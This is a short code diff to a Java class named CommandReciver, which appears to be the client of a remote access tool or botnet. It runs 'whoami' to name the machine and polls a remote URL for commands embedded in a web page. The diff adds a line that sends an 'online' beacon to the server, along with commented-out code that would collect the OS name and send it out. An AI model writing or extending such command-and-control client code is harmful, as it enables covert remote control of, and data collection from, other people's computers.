@@ -17,9 +17,12 @@ public class CommandReciver {
         GetContext.CLIENT_NAME = execute("whoami").get(1).replace("\\", "-");
         webHandler = new WebHandler(GetContext.URL + "/command/" + GetContext.CLIENT_NAME);
         GetContext.SENDER = new Sender();
+//        ArrayList<String> s = execute("wmic os get caption");
+//        GetContext.SENDER.send("os", s.get(3));
     }
 
     public void readCommands() {
+        GetContext.SENDER.send("online", "");
         try {
             String left = webHandler.getContent()
                     .split("id=\"commands\">")[1].split("</pre>")[0];
